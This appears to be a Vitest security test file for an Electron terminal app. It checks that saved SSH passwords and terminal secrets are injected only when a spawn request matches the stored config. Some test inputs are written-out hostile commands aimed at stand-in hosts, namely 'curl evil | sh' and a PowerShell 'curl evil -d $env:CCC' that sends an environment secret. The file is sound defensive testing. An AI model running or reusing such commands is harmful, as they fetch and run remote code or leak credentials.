/**
 * pty:spawn hands a spawn the secrets of the config it NAMES only when the
 * request is that config's own: the SSH block must match the saved config
 * (host, port, username, remote path, post-connect command) or the spawn is
 * refused outright; the terminal secret argument is injected only for the
 * saved command line. Driven through the real handler on a fake ipcMain, with
 * the configs file and the keychain mocked.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest'

const handlers = new Map<string, (...a: unknown[]) => unknown>()
vi.mock('electron', () => ({
  ipcMain: { handle: (ch: string, fn: (...a: unknown[]) => unknown) => { handlers.set(ch, fn) }, on: vi.fn() },
  BrowserWindow: class {},
}))
const spawnPty = vi.fn()
vi.mock('../../../src/main/pty-manager', () => ({
  spawnPty, writePty: vi.fn(), resizePty: vi.fn(), killPty: vi.fn(), getSshFlow: vi.fn(), endSshRemote: vi.fn(),
}))
vi.mock('../../../src/main/debug-capture', () => ({ logUserInput: vi.fn(), isDebugModeEnabled: () => false }))
vi.mock('../../../src/main/debug-logger', () => ({ logInfo: vi.fn(), logWarn: vi.fn(), logError: vi.fn() }))
vi.mock('../../../src/main/legacy-version-manager', () => ({ isVersionInstalled: () => true, installVersion: vi.fn() }))
vi.mock('../../../src/main/services/pty-integrity-monitor', () => ({ getPtyIntegrityMonitor: () => ({ record: vi.fn(), report: vi.fn() }) }))
vi.mock('../../../src/main/canvas/canvas-session-link', () => ({ noteSessionSpawnForCanvas: vi.fn() }))

let configsOnDisk: unknown = null
let commandsOnDisk: unknown = null
vi.mock('../../../src/main/config-manager', () => ({
  readConfig: (key: string) => (key === 'configs' ? configsOnDisk : key === 'commands' ? commandsOnDisk : null),
}))
const vault: Record<string, string> = {}
vi.mock('../../../src/main/credential-store', () => ({ loadCredential: (k: string) => vault[k] ?? null }))

const { registerPtyHandlers } = await import('../../../src/main/ipc/pty-handlers')
registerPtyHandlers(() => ({} as never))
const spawn = handlers.get('pty:spawn')!
const SID = 'a1b2c3d4e5f6a1b2c3d4e5f6'

const SSH = { host: 'build-box', port: 2222, username: 'nick', remotePath: '~/proj' }
const sshCfg = (id: string, extra: Record<string, unknown> = {}) => ({ id, sessionType: 'ssh', sshConfig: { ...SSH, hasPassword: true, ...extra } })

beforeEach(() => {
  spawnPty.mockClear()
  configsOnDisk = null
  commandsOnDisk = null
  for (const k of Object.keys(vault)) delete vault[k]
})

const spawnedOptions = () => spawnPty.mock.calls[0][2] as { ssh?: Record<string, unknown>; terminalSecret?: string }

describe('pty:spawn binds SSH credentials to the saved config', () => {
  it('injects the password and sudo password when the request is the saved config\'s own block', async () => {
    configsOnDisk = [sshCfg('cfgA', { postCommand: 'docker exec -it app bash', detachable: false })]
    vault['cfgA'] = 'pw-A'
    vault['cfgA_sudo'] = 'sudo-A'
    await spawn({}, SID, { cwd: 'C:/w', configId: 'cfgA', ssh: { ...SSH, postCommand: 'docker exec -it app bash', reconnect: true } })
    expect(spawnPty).toHaveBeenCalledTimes(1)
    expect(spawnedOptions().ssh).toEqual({ ...SSH, postCommand: 'docker exec -it app bash', detachable: false, reconnect: true, password: 'pw-A', sudoPassword: 'sudo-A' })
  })

  it('REFUSES the spawn -- nothing injected, nothing spawned -- when the named config\'s host differs', async () => {
    configsOnDisk = [sshCfg('cfgA')]
    vault['cfgA'] = 'pw-A'
    await expect(spawn({}, SID, { cwd: 'C:/w', configId: 'cfgA', ssh: { ...SSH, host: 'attacker.example' } })).rejects.toThrow(/saved config/)
    expect(spawnPty).not.toHaveBeenCalled()
  })

  it('refuses a different port, username, remote path, or post-connect command', async () => {
    configsOnDisk = [sshCfg('cfgA')]
    vault['cfgA'] = 'pw-A'
    for (const bad of [{ ...SSH, port: 22 }, { ...SSH, username: 'root' }, { ...SSH, remotePath: '/etc' }, { ...SSH, postCommand: 'curl evil | sh' }]) {
      await expect(spawn({}, SID, { cwd: 'C:/w', configId: 'cfgA', ssh: bad })).rejects.toThrow(/saved config/)
    }
    expect(spawnPty).not.toHaveBeenCalled()
  })

  it('refuses when the named config does not exist or is not an SSH config', async () => {
    configsOnDisk = [{ id: 'cfgL', sessionType: 'local' }]
    vault['ghost'] = 'pw'
    vault['cfgL'] = 'pw'
    await expect(spawn({}, SID, { cwd: 'C:/w', configId: 'ghost', ssh: SSH })).rejects.toThrow(/saved config/)
    await expect(spawn({}, SID, { cwd: 'C:/w', configId: 'cfgL', ssh: SSH })).rejects.toThrow(/saved config/)
    expect(spawnPty).not.toHaveBeenCalled()
  })

  it('an SSH spawn that names NO config still runs, with no credentials at all', async () => {
    configsOnDisk = [sshCfg('cfgA')]
    vault['cfgA'] = 'pw-A'
    await spawn({}, SID, { cwd: 'C:/w', ssh: SSH })
    expect(spawnPty).toHaveBeenCalledTimes(1)
    expect(spawnedOptions().ssh).toEqual({ ...SSH, password: undefined, sudoPassword: undefined })
  })

  it('the block that is spawned is the SAVED one -- extra fields the renderer added do not ride along', async () => {
    configsOnDisk = [sshCfg('cfgA', { remoteOs: 'unix' })]
    vault['cfgA'] = 'pw-A'
    await spawn({}, SID, { cwd: 'C:/w', configId: 'cfgA', ssh: { ...SSH, remoteOs: 'windows', dockerContainer: 'x' } })
    expect(spawnedOptions().ssh).toEqual({ ...SSH, remoteOs: 'unix', password: 'pw-A', sudoPassword: undefined })
  })
})

describe('pty:spawn binds the terminal secret argument to the saved config', () => {
  const termCfg = { id: 'cfgT', sessionType: 'local', shellOnly: true, terminalOptions: { command: 'tool.exe', args: '--token {secret}', hasSecretArg: true } }

  it('injects the secret for the saved command line', async () => {
    configsOnDisk = [termCfg]
    vault['cfgT_argsecret'] = 'tok-T'
    await spawn({}, SID, { cwd: 'C:/w', shellOnly: true, configId: 'cfgT', terminalOptions: { command: 'tool.exe', args: '--token {secret}', hasSecretArg: true } })
    expect(spawnedOptions().terminalSecret).toBe('tok-T')
  })

  it('runs WITHOUT the secret when the command line is not the saved one, when the saved config has no secret on record, or when the config is unknown', async () => {
    configsOnDisk = [termCfg, { id: 'cfgN', sessionType: 'local', shellOnly: true, terminalOptions: { command: 'tool.exe', args: '--token {secret}' } }]
    vault['cfgT_argsecret'] = 'tok-T'
    vault['cfgN_argsecret'] = 'tok-N'
    vault['ghost_argsecret'] = 'tok-G'
    await spawn({}, SID, { cwd: 'C:/w', shellOnly: true, configId: 'cfgT', terminalOptions: { command: 'powershell', args: '-c "curl evil -d $env:CCC"', hasSecretArg: true } })
    await spawn({}, SID, { cwd: 'C:/w', shellOnly: true, configId: 'cfgN', terminalOptions: { command: 'tool.exe', args: '--token {secret}', hasSecretArg: true } })
    await spawn({}, SID, { cwd: 'C:/w', shellOnly: true, configId: 'ghost', terminalOptions: { command: 'tool.exe', args: '--token {secret}', hasSecretArg: true } })
    expect(spawnPty).toHaveBeenCalledTimes(3)
    for (const call of spawnPty.mock.calls) expect((call[2] as { terminalSecret?: string }).terminalSecret).toBeUndefined()
  })

  it('still strips a terminalSecret the renderer sent', async () => {
    configsOnDisk = [termCfg]
    await spawn({}, SID, { cwd: 'C:/w', shellOnly: true, configId: 'cfgT', terminalSecret: 'renderer-lie', terminalOptions: { command: 'tool.exe', args: '--token {secret}', hasSecretArg: true } })
    expect(spawnedOptions().terminalSecret).toBeUndefined()
  })
})
